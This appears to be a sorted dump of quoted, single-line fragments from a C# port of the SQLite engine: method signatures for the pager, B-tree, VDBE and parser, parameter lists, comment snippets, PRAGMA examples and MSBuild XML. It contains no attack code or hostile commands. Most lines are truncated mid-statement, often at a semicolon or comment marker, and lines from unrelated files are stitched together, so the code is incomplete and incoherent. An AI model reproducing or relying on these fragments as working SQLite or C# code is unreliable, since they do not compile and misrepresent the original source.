"    static void OSTRACE2( string X, object Y ) { if ( sqlite3OsTrace ) sqlite3DebugPrintf( X, Y )"
"    static void OSTRACE3( string X, object Y, object Z ) { if ( sqlite3OsTrace ) sqlite3DebugPrintf( X, Y, Z )"
"    static void OSTRACE4( string X, object Y, object Z, object A ) { if ( sqlite3OsTrace ) sqlite3DebugPrintf( X, Y, Z, A )"
"    static void OSTRACE5( string X, object Y, object Z, object A, object B ) { if ( sqlite3OsTrace ) sqlite3DebugPrintf( X, Y, Z, A, B )"
"    static void OSTRACE6( string X, object Y, object Z, object A, object B, object C ) { if ( sqlite3OsTrace ) sqlite3DebugPrintf( X, Y, Z, A, B, C )"
"    static void OSTRACE7( string X, object Y, object Z, object A, object B, object C, object D ) { if ( sqlite3OsTrace ) sqlite3DebugPrintf( X, Y, Z, A, B, C, D )"
"    static void PAGERTRACE( string T, params object[] ap ) { if ( sqlite3PagerTrace )sqlite3DebugPrintf( T, ap )"
"    static void REGISTER_TRACE( Vdbe p, int R, Mem M )"
"    static void SETBIT( byte[] V, int I ) { V[I >> 3] "
"    static void SQLITE_SKIP_UTF8( string zIn, ref int iz )"
"    static void SWAP<T>( ref T A, ref T B ) { T t = A"
"    static void TRACE(string X, params object[] ap) { }"
"    static void UNUSED_PARAMETER2<T1, T2>( T1 x, T2 y ) { UNUSED_PARAMETER( x )"
"    static void VdbeComment( Vdbe v, string zFormat, params object[] ap ) { sqlite3VdbeComment( v, zFormat, ap )"
"    static void VdbeNoopComment( Vdbe v, string zFormat, params object[] ap ) { sqlite3VdbeNoopComment( v, zFormat, ap )"
"    static void WHERETRACE( string X, params object[] ap ) { if ( sqlite3WhereTrace ) sqlite3DebugPrintf( X, ap )"
"    static void analyzeDatabase( Parse pParse, int iDb )"
"    static void analyzeTable( Parse pParse, Table pTab )"
"    static void appendSpace( StrAccum pAccum, int N )"
"    static void assertParentIndex(MemPage pParent, int iIdx, Pgno iChild)"
"    static void autoIncStep( Parse pParse, int memId, int regRowid )"
"    static void cacheEntryClear( Parse pParse, yColCache p )"
"    static void callCollNeeded( sqlite3 db, string zName )"
"    static void clearSelect( sqlite3 db, Select p )"
"    static void codeApplyAffinity( Parse pParse, int _base, int n, Index pIdx )"
"    static void codeInteger( Vdbe v, Expr pExpr, bool negFlag, int iMem )"
"    static void codeReal( Vdbe v, string z, bool negateFlag, int iMem )"
"    static void computeLimitRegisters( Parse pParse, Select p, int iBreak )"
"    static void copyNodeContent(MemPage pFrom, MemPage pTo, ref int pRC)"
"    static void createMask( WhereMaskSet pMaskSet, int iCursor )"
"    static void destroyRootPage( Parse pParse, int iTable, int iDb )"
"    static void destroyTable( Parse pParse, Table pTab )"
"    static void disableTerm( WhereLevel pLevel, WhereTerm pTerm )"
"    static void dropCell(MemPage pPage, int idx, int sz, ref int pRC)"
"    static void exprCommute( Parse pParse, Expr pExpr )"
"    static void finalizeAggFunctions( Parse pParse, AggInfo pAggInfo )"
"    static void fprintf( TextWriter tw, string zFormat, params object[] ap ) { tw.Write( sqlite3_mprintf( zFormat, ap ) )"
"    static void freeEphemeralFunction( sqlite3 db, FuncDef pDef )"
"    static void freeP4( sqlite3 db, int p4type, object p4 )"
"    static void freePage(MemPage pPage, ref int pRC)"
"    static void heightOfExpr( Expr p, ref int pnHeight )"
"    static void heightOfExprList( ExprList p, ref int pnHeight )"
"    static void heightOfSelect( Select p, ref int pnHeight )"
"    static void identPut( StringBuilder z, ref int pIdx, string zSignedIdent )"
"    static void invalidateIncrblobCursors(Btree x, i64 y, int z) { }"
"    static void loadAnalysis( Parse pParse, int iDb )"
"    static void memTracePrint( FILE _out, Mem p )"
"    static void parseCell( MemPage pPage, int iCell, ref CellInfo pInfo )"
"    static void pcache1Cachesize( sqlite3_pcache p, int nMax )"
"    static void pcache1Truncate( sqlite3_pcache p, u32 iLimit )"
"    static void pcache1Unpin( sqlite3_pcache p, PgHdr pPg, int reuseUnlikely )"
"    static void printf( string zFormat, params object[] ap ) { Console.Out.Write( sqlite3_mprintf( zFormat, ap ) )"
"    static void ptrmapPut(BtShared pBt, Pgno key, u8 eType, Pgno parent, ref int pRC)"
"    static void ptrmapPutOvflPtr(MemPage pPage, int pCell, ref int pRC)"
"    static void ptrmapPutOvflPtr(MemPage pPage, u8[] pCell, ref int pRC)"
"    static void put2byte( byte[] pData, int Offset, int v )"
"    static void put2byte( byte[] pData, int Offset, u32 v )"
"    static void put32bits( byte[] ac, int offset, int val )"
"    static void put32bits( byte[] ac, int offset, u32 val )"
"    static void put32bits( byte[] ac, u32 val )"
"    static void put32bits( string ac, int offset, int val )"
"    static void registerTrace( FILE _out, int iReg, Mem p )"
"    static void reindexDatabases( Parse pParse, string zColl )"
"    static void reindexTable( Parse pParse, Table pTab, string zColl )"
"    static void releaseMemArray( Mem[] p, int N )"
"    static void reloadTableSchema( Parse pParse, Table pTab, string zName )"
"    static void resetAccumulator( Parse pParse, AggInfo pAggInfo )"
"    static void resolveP2Values( Vdbe p, ref int pMaxFuncArgs )"
"    static void returnSingleInt( Parse pParse, string zLabel, i64 value )"
"    static void setDateTimeToCurrent( sqlite3_context context, DateTime p )"
"    static void setJoinExpr( Expr p, int iTable )"
"    static void setLikeOptFlag( sqlite3 db, string zName, int flagVal )"
"    static void spanExpr(ExprSpan pOut, Parse pParse, int op, Token pValue)"
"    static void spanSet(ExprSpan pOut, Token pStart, Token pEnd)"
"    static void sqlite3AddCollateType( Parse pParse, Token pToken )"
"    static void sqlite3AddColumn( Parse pParse, Token pName )"
"    static void sqlite3AddColumnType( Parse pParse, Token pType )"
"    static void sqlite3AddDefaultValue( Parse pParse, ExprSpan pSpan )"
"    static void sqlite3AddNotNull( Parse pParse, int onError )"
"    static void sqlite3AddPrimaryKey( Parse pParse, int null_2, int onError, int autoInc, int sortOrder )"
"    static void sqlite3AlterBeginAddColumn( Parse pParse, SrcList pSrc )"
"    static void sqlite3AlterFinishAddColumn( Parse pParse, Token pColDef )"
"    static void sqlite3Analyze( Parse pParse, Token pName1, Token pName2 )"
"    static void sqlite3Analyze( Parse pParse, int null_2, int null_3 )"
"    static void sqlite3Attach( Parse pParse, Expr p, Expr pDbname, Expr pKey )"
"    static void sqlite3AuthRead( Parse a, Expr b, Schema c, SrcList d ) { }"
"    static void sqlite3BackupUpdate( sqlite3_backup pBackup, Pgno iPage, byte[] aData )"
"    static void sqlite3BeginParse( Parse pParse, int explainFlag )"
"    static void sqlite3BeginTransaction( Parse pParse, int type )"
"    static void sqlite3BeginWriteOperation( Parse pParse, int setStatement, int iDb )"
"    static void sqlite3BitvecClear( Bitvec p, u32 i, u32[] pBuf )"
"    static void sqlite3BtreeGetMeta(Btree p, int idx, ref u32 pMeta)"
"    static void sqlite3BtreeMutexArrayInsert( BtreeMutexArray X, Btree Y ) { }"
"    static void sqlite3BtreeSetCachedRowid(BtCursor pCur, sqlite3_int64 iRowid)"
"    static void sqlite3BtreeTripAllCursors(Btree pBtree, int errCode)"
"    static void sqlite3ChangeCookie( Parse pParse, int iDb )"
"    static void sqlite3CodeVerifySchema( Parse pParse, int iDb )"
"    static void sqlite3ColumnDefault( Vdbe v, Table pTab, int i, int iReg )"
"    static void sqlite3ConnectionBlocked( sqlite3 x, sqlite3 y ) { } //"
"    static void sqlite3CreateForeignKey( Parse pParse, int null_2, Token pTo, ExprList pToCol, int flags )"
"    static void sqlite3CreateIndex( Parse pParse, int null_2, int null_3, int null_4, ExprList pList, int onError, int null_7, int null_8, int sortOrder, int ifNotExist )"
"    static void sqlite3CreateIndex( Parse pParse, int null_2, int null_3, int null_4, int null_5, int onError, int null_7, int null_8, int sortOrder, int ifNotExist )"
"    static void sqlite3DebugPrintf( string zFormat, params va_list[] ap )"
"    static void sqlite3DeferForeignKey( Parse pParse, int isDeferred )"
"    static void sqlite3DeleteTrigger( sqlite3 db, ref Trigger pTrigger )"
"    static void sqlite3DeleteTriggerStep( sqlite3 db, ref TriggerStep pTriggerStep )"
"    static void sqlite3Detach( Parse pParse, Expr pDbname )"
"    static void sqlite3DropIndex( Parse pParse, SrcList pName, int ifExists )"
"    static void sqlite3DropTable( Parse pParse, SrcList pName, int isView, int noErr )"
"    static void sqlite3DropTrigger( Parse pParse, SrcList pName, int noErr )"
"    static void sqlite3DropTriggerPtr( Parse pParse, Trigger pTrigger )"
"    static void sqlite3EndTable( Parse pParse, Token pCons, Token pEnd, int null_4 )"
"    static void sqlite3EndTable( Parse pParse, int null_2, int null_3, Select pSelect )"
"    static void sqlite3Error( sqlite3 db, int err_code, int noString )"
"    static void sqlite3Error( sqlite3 db, int err_code, string zFormat, params object[] ap )"
"    static void sqlite3ErrorMsg( Parse pParse, string zFormat, params object[] ap )"
"    static void sqlite3ExprAnalyzeAggList( NameContext pNC, ExprList pList )"
"    static void sqlite3ExprAnalyzeAggregates( NameContext pNC, ref  Expr pExpr )"
"    static void sqlite3ExprAssignVarNumber( Parse pParse, Expr pExpr )"
"    static void sqlite3ExprCacheAffinityChange( Parse pParse, int iStart, int iCount )"
"    static void sqlite3ExprCachePinRegister( Parse pParse, int iReg )"
"    static void sqlite3ExprCachePop( Parse pParse, int N )"
"    static void sqlite3ExprCacheRemove( Parse pParse, int iReg )"
"    static void sqlite3ExprCacheStore( Parse pParse, int iTab, int iCol, int iReg )"
"    static void sqlite3ExprClear( sqlite3 db, Expr p )"
"    static void sqlite3ExprCodeConstants( Parse pParse, Expr pExpr )"
"    static void sqlite3ExprCodeCopy( Parse pParse, int iFrom, int iTo, int nReg )"
"    static void sqlite3ExprCodeMove( Parse pParse, int iFrom, int iTo, int nReg )"
"    static void sqlite3ExprDelete( sqlite3 db, ref Expr p )"
"    static void sqlite3ExprHardCopy( Parse pParse, int iReg, int nReg )"
"    static void sqlite3ExprIfFalse( Parse pParse, Expr pExpr, int dest, int jumpIfNull )"
"    static void sqlite3ExprIfTrue( Parse pParse, Expr pExpr, int dest, int jumpIfNull )"
"    static void sqlite3ExprListDelete( sqlite3 db, ref ExprList pList )"
"    static void sqlite3ExprSetHeight( Parse pParse, Expr p )"
"    static void sqlite3IdListDelete( sqlite3 db, ref IdList pList )"
"    static void sqlite3IndexAffinityStr( Vdbe v, Index pIdx )"
"    static void sqlite3Insert( Parse pParse, SrcList pTabList, ExprList pList, int null_4, IdList pColumn, int onError )"
"    static void sqlite3Insert( Parse pParse, SrcList pTabList, int null_3, Select pSelect, IdList pColumn, int onError )"
"    static void sqlite3Insert( Parse pParse, SrcList pTabList, int null_3, int null_4, IdList pColumn, int onError )"
"    static void sqlite3MinimumFileFormat( Parse pParse, int iDb, int minFormat )"
"    static void sqlite3NestedParse( Parse pParse, string zFormat, params object[] ap )"
"    static void sqlite3OpenMasterTable( Parse p, int iDb )"
"    static void sqlite3OsDlClose( sqlite3_vfs pVfs, HANDLE pHandle )"
"    static void sqlite3OsDlError( sqlite3_vfs pVfs, int nByte, ref string zBufOut )"
"    static void sqlite3PCacheBufferSetup( object pBuf, int sz, int n )"
"    static void sqlite3PagerSetCachesize( Pager pPager, int mxPage )"
"    static void sqlite3PagerSetSafetyLevel( Pager pPager, int level, bool bFullFsync )"
"    static void sqlite3PagerTruncateImage( Pager pPager, u32 nPage )"
"    static void sqlite3ParserTrace(TextWriter TraceFILE, string zTracePrompt)"
"    static void sqlite3PcacheIterateDirty( PCache pCache, dxIter xIter )"
"    static void sqlite3PcacheMove( PgHdr p, Pgno newPgno )"
"    static void sqlite3PcacheSetCachesize( PCache pCache, int mxPage )"
"    static void sqlite3PcacheSetPageSize( PCache pCache, int szPage )"
"    static void sqlite3PcacheTruncate( PCache pCache, u32 pgno )"
"    static void sqlite3Pragma( Parse pParse, Token pId1, Token pId2, int null_4, int minusFlag )"
"    static void sqlite3Put4byte( byte[] p, int offset, int v )"
"    static void sqlite3Put4byte( byte[] p, int offset, u64 v )"
"    static void sqlite3Put4byte( byte[] p, int v )"
"    static void sqlite3Put4byte( byte[] p, u32 offset, u32 v )"
"    static void sqlite3Put4byte( byte[] p, u64 v )"
"    static void sqlite3RefillIndex( Parse pParse, Index pIndex, int memRootPage )"
"    static void sqlite3RegisterLikeFunctions( sqlite3 db, int caseSensitive )"
"    static void sqlite3Reindex( Parse pParse, Token pName1, Token pName2 )"
"    static void sqlite3Reindex( Parse pParse, int null_2, int null_3 )"
"    static void sqlite3ReleaseTempRange( Parse pParse, int iReg, int nReg )"
"    static void sqlite3ReleaseTempReg( Parse pParse, int iReg )"
"    static void sqlite3ResetInternalSchema( sqlite3 db, int iDb )"
"    static void sqlite3RootPageMoved( Db pDb, int iFrom, int iTo )"
"    static void sqlite3RowSetInsert( RowSet p, i64 rowid )"
"    static void sqlite3Savepoint( Parse pParse, int op, Token pName )"
"    static void sqlite3SelectAddTypeInfo( Parse pParse, Select pSelect )"
"    static void sqlite3SelectDelete( sqlite3 db, ref Select p )"
"    static void sqlite3SelectDestInit( SelectDest pDest, int eDest, int iParm )"
"    static void sqlite3SelectExpand( Parse pParse, Select pSelect )"
"    static void sqlite3SetString( ref byte[] pz, sqlite3 db, string zFormat, params string[] ap )"
"    static void sqlite3SetString( ref string pz, sqlite3 db, string zFormat, byte[] ap )"
"    static void sqlite3SetString( ref string pz, sqlite3 db, string zFormat, params string[] ap )"
"    static void sqlite3SrcListAssignCursors( Parse pParse, SrcList pList )"
"    static void sqlite3SrcListDelete( sqlite3 db, ref SrcList pList )"
"    static void sqlite3SrcListIndexedBy( Parse pParse, SrcList p, Token pIndexedBy )"
"    static void sqlite3StackAllocRaw( sqlite3 D, int N ) { sqlite3DbMallocRaw( D, N )"
"    static void sqlite3StackAllocZero( sqlite3 D, int N ) { sqlite3DbMallocZero( D, N )"
"    static void sqlite3StatusAdd( int op, int N )"
"    static void sqlite3StatusSet( int op, int X )"
"    static void sqlite3StrAccumAppend( StrAccum p, string z, int N )"
"    static void sqlite3StrAccumInit( StrAccum p, StringBuilder zBase, int n, int mx )"
"    static void sqlite3TableAffinityStr( Vdbe v, Table pTab )"
"    static void sqlite3TableLock( Parse p, int p1, int p2, u8 p3, byte[] p4 ) { }"
"    static void sqlite3TableLock( Parse p, int p1, int p2, u8 p3, string p4 ) { }"
"    static void sqlite3UnlinkAndDeleteIndex( sqlite3 db, int iDb, string zIdxName )"
"    static void sqlite3UnlinkAndDeleteTable( sqlite3 db, int iDb, string zTabName )"
"    static void sqlite3UnlinkAndDeleteTrigger( sqlite3 db, int iDb, string zName )"
"    static void sqlite3VdbeChangeP1( Vdbe p, int addr, int val )"
"    static void sqlite3VdbeChangeP2( Vdbe p, int addr, int val )"
"    static void sqlite3VdbeChangeP3( Vdbe p, int addr, int val )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, CollSeq pColl, int n )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, FuncDef pFunc, int n )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, KeyInfo pKeyInfo, int n )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, Mem m, int n )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, char c, int n )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, int i32n, int n )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, string z, dxDel P4_Type )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, string z, int n )"
"    static void sqlite3VdbeChangeP4( Vdbe p, int addr, union_p4 _p4, int n )"
"    static void sqlite3VdbeChangeP5( Vdbe p, u8 val )"
"    static void sqlite3VdbeChangeToNoop( Vdbe p, int addr, int N )"
"    static void sqlite3VdbeComment( Vdbe p, string zFormat, params object[] ap )"
"    static void sqlite3VdbeDeleteAuxData( VdbeFunc pVdbeFunc, int mask )"
"    static void sqlite3VdbeFreeCursor( Vdbe p, VdbeCursor pCx )"
"    static void sqlite3VdbeJumpHere( Vdbe p, int addr )"
"    static void sqlite3VdbeMemMove( Mem pTo, Mem pFrom )"
"    static void sqlite3VdbeMemPrettyPrint( Mem pMem, StringBuilder zBuf )"
"    static void sqlite3VdbeMemSetDouble( Mem pMem, double val )"
"    static void sqlite3VdbeMemSetInt64( Mem pMem, i64 val )"
"    static void sqlite3VdbeMemSetZeroBlob( Mem pMem, int n )"
"    static void sqlite3VdbeMemShallowCopy( Mem pTo, Mem pFrom, int srcType )"
"    static void sqlite3VdbeNoopComment( Vdbe p, string zFormat, params object[] ap )"
"    static void sqlite3VdbePrintOp( FILE pOut, int pc, Op pOp )"
"    static void sqlite3VdbeResolveLabel( Vdbe p, int x )"
"    static void sqlite3VdbeSetChanges( sqlite3 db, int nChange )"
"    static void sqlite3VdbeSetNumCols( Vdbe p, int nResColumn )"
"    static void sqlite3VdbeSetSql( Vdbe p, string z, int n, int isPrepareV2 )"
"    static void sqlite3VdbeSwap( Vdbe pA, Vdbe pB )"
"    static void sqlite3VdbeTrace( Vdbe p, FILE trace )"
"    static void sqlite3VdbeUsesBtree( Vdbe p, int i )"
"    static void sqlite3VtabArgExtend( Parse p, Token t ) { }//"
"    static void sqlite3VtabBeginParse( Parse p, Token t1, Token t2, Token t3 ) { }//"
"    static void sqlite3VtabFinishParse<T>( Parse P, T t ) { }//"
"    static void sqlite3_randomness( int N, ref i64 pBuf )"
"    static void sqlite3_result_error_code( sqlite3_context pCtx, int errCode )"
"    static void sqlite3_result_int( sqlite3_context pCtx, int iVal )"
"    static void sqlite3_result_int64( sqlite3_context pCtx, i64 iVal )"
"    static void sqlite3_result_text16( sqlite3_context pCtx, string z, int n, dxDel xDel ) { }"
"    static void sqlite3_result_value( sqlite3_context pCtx, sqlite3_value pValue )"
"    static void sqlite3_result_zeroblob( sqlite3_context pCtx, int n )"
"    static void sqliteViewResetAll( sqlite3 db, int idx )"
"    static void storeTypeInfo( Mem A, int B )"
"    static void transferJoinMarkings( Expr pDerived, Expr pBase )"
"    static void updateAccumulator( Parse pParse, AggInfo pAggInfo )"
"    static void va_start( object[] ap, string zFormat )"
"    static void whereAndInfoDelete( sqlite3 db, WhereAndInfo p )"
"    static void whereInfoFree( sqlite3 db, WhereInfo pWInfo )"
"    static void whereOrInfoDelete( sqlite3 db, WhereOrInfo p )"
"    static void whereSplit( WhereClause pWC, Expr pExpr, int op )"
"    static void yyStackOverflow(yyParser yypParser, YYMINORTYPE yypMinor)"
"    static void zeroPage(MemPage pPage, int flags)"
"    strftime( FORMAT, TIMESTRING, MOD, MOD, ...)"
"    string filename,   /"
"    string fmt,                   /"
"    string pAux,"
"    string pKey,   /"
"    string z,               /"
"    string z,            /"
"    string z,           /"
"    string z,"
"    string zAlias1,       /"
"    string zAlias2,       /"
"    string zCol,          /"
"    string zCol,        /"
"    string zData,         /"
"    string zData,"
"    string zDate,"
"    string zDb,         /"
"    string zDestDb,                  /"
"    string zFile,         /"
"    string zFile,        /"
"    string zFile,"
"    string zFilename,         /"
"    string zFilename,        /"
"    string zFilename,       /"
"    string zFilename,     /"
"    string zFilename, /"
"    string zFilename,"
"    string zFormat,"
"    string zFunc,       /"
"    string zFunctionName,"
"    string zIn,          /"
"    string zMaster,       /"
"    string zMsg1,"
"    string zName,           /"
"    string zName,         /"
"    string zName,       /"
"    string zName,     /"
"    string zName,"
"    string zObj,    /"
"    string zPath,"
"    string zPattern,            /"
"    string zProc,         /"
"    string zProc,        /"
"    string zRelative,             /"
"    string zSql,                /"
"    string zSql,              /"
"    string zSql,            /"
"    string zSql,          /"
"    string zString,             /"
"    string zTab,        /"
"    string zType,       /"
"    string zType,     /"
"    time( TIMESTRING, MOD, MOD, ...)"
"    u16 wctrlFlags,       /"
"    u16[] aSize,      /"
"    u32 amt,            /"
"    u32 iOld,"
"    u32 nByte,                 /"
"    u32 offset,         /"
"    u32 op,               /"
"    u32 pBufOffset,            /"
"    u32 payloadOffset,         /"
"    u32 pgno,            /"
"    u32 pgno,          /"
"    u32 serial_type,              /"
"    u32 serial_type,    /"
"    u8 eType,                /"
"    u8 eType,              /"
"    u8 enc,                 /"
"    u8 enc,              /"
"    u8 enc,             /"
"    u8 enc,"
"    u8 op,                     /"
"    u8[] aOvflSpace,               /"
"    u8[] apCell,      /"
"    u8[] pCell,            /"
"    u8[] pCell,         /"
"    u8[] pTemp,         /"
"    u8[][] apCell,    /"
"    unsigned flags,        /"
"    void sqlite3PrintSelect( Select p, int indent )"
"    void_function xBenignBegin, //void ("
"    yyParser p,                    /"
"    yyParser pParser,         /"
"    yyParser yyp,                   /"
"    yyParser yypParser,           /"
"    yyParser yypParser,          /"
"    yyParser yypParser,         /"
"    yyParser yypParser,    /"
"    zStmt = sqlite3MPrintf(db, ""CREATE VIRTUAL TABLE %T"", "
"    zWhere = sqlite3MPrintf(db, ""name='%q'"", pTab->zName)"
"    { //, ...){"
"    { btreeParseCellPtr( pPage, pCell, 0, ref pInfo )"
"    { btreeParseCellPtr(pPage, pPage.aData, iCell, ref pInfo)"
"    { return new FuncDef( zName, SQLITE_UTF8, nArg, arg, (u8)( nc "
"    { return new FuncDef( zName, SQLITE_UTF8, nArg, arg, likeFunc, flags )"
"    { return new FuncDef( zName, SQLITE_UTF8, nArg, iArg, (u8)( bNC "
"    { return putVarint( p, offset, (u64)v )"
"    { return sqlite3GetVarint32( p, 0, ref v )"
"    { return sqlite3IdListAppend( db, null, pToken )"
"    { return sqlite3PutVarint( p, offset, (u64)v )"
"    { return sqlite3StrNICmp(  zLeft,  offsetLeft,  zRight,  N )"
"    { return sqlite3TriggerInsertStep( db, pTableName, pColumn, null, null, orconf )"
"    { return sqlite3TriggerInsertStep( db, pTableName, pColumn, null, pSelect, orconf )"
"    { return sqlite3TriggerInsertStep( db, pTableName, pColumn, pEList, null, orconf )"
"    { sqlite3AddPrimaryKey( pParse, null, onError, autoInc, sortOrder )"
"    { sqlite3Analyze( pParse, null, null )"
"    { sqlite3CreateForeignKey( pParse, null, pTo, pToCol, flags )"
"    { sqlite3CreateIndex( pParse, null, null, null, null, onError, null, null, sortOrder, ifNotExist )"
"    { sqlite3CreateIndex( pParse, null, null, null, pList, onError, null, null, sortOrder, ifNotExist )"
"    { sqlite3EndTable( pParse, null, null, pSelect )"
"    { sqlite3EndTable( pParse, pCons, pEnd, null )"
"    { sqlite3Error( db, err_code, err_code == 0 "
"    { sqlite3Insert( pParse, pTabList, null, null, pColumn, onError )"
"    { sqlite3Insert( pParse, pTabList, null, pSelect, pColumn, onError )"
"    { sqlite3Insert( pParse, pTabList, pList, null, pColumn, onError )"
"    { sqlite3Pragma( pParse, pId1, pId2, null, minusFlag )"
"    { sqlite3Put4byte( ac, 0U, val )"
"    { sqlite3Put4byte( ac, offset, (u32)val )"
"    { sqlite3Put4byte( ac, offset, val )"
"    { sqlite3Reindex( pParse, null, null )"
"    { sqlite3SetString( ref pz, db, zFormat, Encoding.UTF8.GetString( ap ) )"
"    }else if( sqlite3_test_control(SQLITE_TESTCTRL_ASSERT, 1) ){"
"   ""/home/bill/a.db-journal"
"   ""checksum"": ""eee70b132cc4f9644d01f989e18fdb38"","
"   ""roots"": {"
"   ""version"": 1"
"   (3) tkEXPLAIN   The ""explain"" keyword."
"   (4) tkCREATE    The ""create"" keyword."
"   (5) SEMI      We've seen the first semicolon in the """
"   (5) tkTEMP      The ""temp"" or ""temporary"" keyword."
"   (6) END       We've seen the """
"   (6) tkTRIGGER   The ""trigger"" keyword."
"   (7) tkEND       The ""end"" keyword."
"   (a) the cursor is open for writing,"
"   (b) there is a read/write transaction open,"
"   (c) the connection holds a write-lock on the table (if required),"
"   (d) there are no conflicting read-locks, and"
"   0 <= N < YYNSTATE                  Shift N.  That is, push the lookahead"
"   1) By this function. In this case, all BtShared mutexes and the mutex"
"   1) It rolls back the journal file, restoring all database file and"
"   1.  A read/write cursor pointing to pTab, the table containing the row"
"   1. Regardless of the value of createFlag, the cache is searched for a "
"   2) By function vtabDisconnectAll(), when it adds a VTable entry to"
"   2) If the pager is running in exclusive-mode, and there are currently"
"   2) It finalizes the journal file, so that it is not used for hot"
"   2) It is a system table (i.e. sqlite_master), this call is not"
"   2) When a free-list leaf page is reused, its content is not read"
"   2. If createFlag==0 and the page is not already in the cache, NULL is"
"   2. There is a single expression in the result set, and it is"
"   3) If the argument db is not NULL, then none of the entries in the"
"   3) If the sibling pages are not leaves, then the child pages of"
"   3.  The ""iCur"" cursor must be pointing to the row that is to be"
"   3. If createFlag is 1, and the page is not already in the cache,"
"   4) If the sibling pages are not internal intkey nodes, then any"
"   5) If the sibling pages are not leaves, then the pointer-map"
"   5. Otherwise, allocate and return a new page buffer."
"   <tr><td>1<td>If createFlag is set to 1, this indicates that "
"   <tr><td>2<td>If createFlag is set to 2, then SQLite is not holding any"
"   AGGREGATE(zName, nArg, iArg, bNC, xStep, xFinal)"
"   APIs, they may still be used successfully."
"   AeqB:   outA, nextA         nextA             nextA         outA, nextA"
"   After this has happened, new pages appended to the database"
"   AgtB:   outB, nextB      outB, nextB          nextB            nextB"
"   AltB:   outA, nextA      outA, nextA       outA, nextA         nextA"
"   CREATE TABLE t1(a,b,c,d)"
"   DELETE, or UPDATE and return "
"   Depending on the SQLite configuration, the database handles and/or"
"   EofA:   outB, nextB      outB, nextB          halt             halt"
"   EofB:   outA, nextA      outA, nextA       outA, nextA         halt"
"   FUNCTION(zName, nArg, iArg, bNC, xFunc)"
"   It is set to true when the change-counter field is updated, which"
"   LIKEFUNC(zName, nArg, pArg, flags)"
"   Non-sharable Btrees (in-memory databases for example), do not have"
"   Once it has been created using backup_init(), a single sqlite3_backup"
"   PRAGMA [database.]lock_proxy_file = "":auto:"""
"   PRAGMA encoding = ""utf-8"""
"   PRAGMA temp_store = ""default"""
"   PRAGMA temp_store_directory = """""
"   Pager.errCode may be set to SQLITE_IOERR, SQLITE_CORRUPT, or"
"   SQLITE_OK. Otherwise, enter the error state and return the first"
"   The changeCountDone flag is inspected. If it is true, the work of"
"   The other sqlite3_backup_XXX() API functions, backup_remaining() and"
"   The same onError processing (OE_Abort, OE_Ignore, etc)"
"   The table that this cursor was opened on still exists, but has been"
"   This is a boolean variable. If true, then any required sub-journal"
"   This mechanism means that when running in exclusive mode, a connection"
"   UPDATE OR IGNORE table_wxyz SET a=b, c=d WHERE e<5 AND f NOT NULL"
"   When committing a transaction, the master journal file name (if any)"
"   a) When reading a free-list leaf page from the database, and"
"   and writeMasterJournal() only. Change its meaning to ""unsynced data"
"   assert( PGHDR1_TO_PAGE(PAGE_TO_PGHDR1(pCache, X))==X )"
"   attempt (2) if (1) is successful. Return SQLITE_OK if successful,"
"   b) if the page content were written at this time, it would not"
"   do not need the PGHDR_NEED_SYNC flag set, as they do not need"
"   fails, then SQLITE_BUSY may be returned to the user and the user"
"   fmt    This is the format string, as in the usual print."
"   has been written to the journal""."
"   int xGetLastError(sqlite3_vfs pVfs, int nBuf, char "
"   is opened as an in-memory journal file. If false, then in-memory"
"   need only update the change-counter once, for the first transaction"
"   next successful rollback is performed on the pager cache. Also,"
"   of either, the error state error code is returned to the caller"
"   or SQLITE_FULL. Once one of the first three errors occurs, it persists"
"   or not (1) is succussful, also attempt (2). If successful, return"
"   pWInfo.a[].pTerm     When wsFlags==WO_OR, the OR-clause term"
"   performed. If successful, task (2). Regardless of the outcome"
"   relinquished on the database file. Each time a transaction is committed,"
"   sqlite3_test_control(SQLITE_TESTCTRL_RESERVE, sqlite3 "
"   table (because there exists one or more read-locks on the table),"
"   this state, restoreCursorPosition() can be called to attempt to"
"   while in the 'pending-lock' state, no connection may start a new"
"   while some other thread is calling backup_step() or backup_finish(),"
"   },"
"  (17)  The sub-query is not a compound select, or it is a UNION ALL"
"  (18)  If the sub-query is a compound select, then all terms of the"
"  (20)  If the sub-query is a compound select, then it must not use"
"  (9)  Zero or more pages instances, each as follows:"
"  (a) the table is not read-only, "
"  //  memcpy(pParse.nVar, saveBuf, SAVE_SZ)"
"  //memset(data[iCellFirst], 0, cbrk-iCellFirst)"
"  //sqlite3DbMallocZero(db, ExprList).Length"
"  //sqlite3_snprintf( 3, pMem.z, ""%.2x"", pOp.p5 )"
"  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. "
"  <Import Project=""$(MSBuildBinPath)"
"  <PropertyGroup Condition="" '$(Configuration)"
"  <Target Name=""AfterBuild"">"
"  <Target Name=""BeforeBuild"">"
"  Additional functions.  The standard set of ""printf"" functions"
"  Any OP_Integer, OP_Real, OP_String, OP_Blob, OP_Null,"
"  Last Change Date: $LastChangedDate: 2009-08-04 13:34:52 -0700 (Tue, 04 Aug 2009) $"
"  The ""="" flag (similar to ""-"") causes the output to be"
"  The %' field works like %c, but takes as its character the"
"  When compiled using GCC on a SPARC, this version of printf is"
"  Wildcards """
"  addModuleArgument(db, pTable, sqlite3DbStrDup(db, db->aDb[iDb].zName))"
"  addModuleArgument(db, pTable, sqlite3DbStrDup(db, pTable->zName))"
"  addModuleArgument(db, pTable, sqlite3NameFromToken(db, pModuleName))"
"  apVtabLock = sqlite3_realloc(pParse->apVtabLock, n)"
"  azModuleArg = sqlite3DbRealloc(db, pTable->azModuleArg, nBytes)"
"  callFinaliser(db, offsetof(sqlite3_module,xCommit))"
"  callFinaliser(db, offsetof(sqlite3_module,xRollback))"
"  define REGISTER_TRACE(R,M) if(p.trace)registerTrace(p.trace,R,M)"
"  define REGISTER_TRACE(R,M)"
"  define assertParentIndex(x,y,z)"
"  define sqlite3VtabArgExtend(P, T)"
"  define sqlite3VtabBeginParse(P, T, T1, T2)"
"  define sqlite3VtabFinishParse(P, T)"
"  define sqlite3VtabSync(X,Y) SQLITE_OK"
"  iDb = sqlite3SchemaToIndex(db, pTable->pSchema)"
"  int i, n"
"  int nArg,       /"
"  int rc, nName"
"  memcpy(pNew->zName, pDef->zName, sqlite3Strlen30(pDef->zName)"
"  mxPathname is 512, which is the same as the minimum allowable value"
